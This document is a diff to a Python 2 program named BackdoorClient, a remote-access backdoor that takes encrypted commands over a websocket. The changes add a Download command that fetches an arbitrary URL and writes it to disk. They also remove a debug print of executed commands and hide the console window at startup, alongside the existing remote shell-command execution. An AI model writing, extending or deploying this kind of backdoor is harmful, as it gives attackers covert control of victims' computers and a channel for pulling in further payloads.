@@ -8,6 +8,7 @@ import threading
 import uuid
 import json
 import time
+import urllib
 from base64 import b64decode, b64encode
 from websocket import create_connection
 from Crypto.Cipher import AES
@@ -46,6 +47,8 @@ class BackdoorClient(threading.Thread):
                             ShowDialog(msg, self)
                         elif command == 'exec_cmd':
                             ExecCmd(msg, self)
+                        elif command == 'download':
+                            Download(msg, self)
 
                 self.ws.close()
 
@@ -69,6 +72,32 @@ class BackdoorClient(threading.Thread):
         return plain
 
 
+class Download(threading.Thread):
+    def __init__(self, msg, client):
+        threading.Thread.__init__(self)
+        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
+        self.client = client
+
+        self.url = msg['url']
+        self.filename = msg['filename']
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            data = urllib.urlopen(self.url).read()
+            with open(self.filename, 'wb') as f:
+                f.write(data)
+
+            self.msg['rlt'] = 'Downloaded: ' + self.filename
+            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
+
+        except Exception as e:
+            self.msg['rlt'] = 'ERROR: ' + e.message
+            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
+
+
 class ExecCmd(threading.Thread):
     def __init__(self, msg, client):
         threading.Thread.__init__(self)
@@ -76,7 +105,6 @@ class ExecCmd(threading.Thread):
         self.client = client
 
         self.command = b64decode(msg['cmd_to_exec'])
-        print self.command
 
         self.daemon = True
         self.start()
@@ -92,7 +120,7 @@ class ExecCmd(threading.Thread):
             self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
 
         except Exception as e:
-            self.msg['rlt'] = 'ERROR:' + e.message
+            self.msg['rlt'] = 'ERROR: ' + e.message
             self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
 
 
@@ -112,7 +140,7 @@ class ShowDialog(threading.Thread):
 
     def run(self):
         ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
-        self.msg['rlt'] = 'OK'
+        self.msg['rlt'] = 'Show dialog OK.'
         self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
 
 
@@ -146,6 +174,7 @@ def hide_cmd_window():
         ctypes.windll.kernel32.CloseHandle(whnd)
 
 if __name__ == '__main__':
+    hide_cmd_window()
     BackdoorClient()
     while True:
         time.sleep(10)
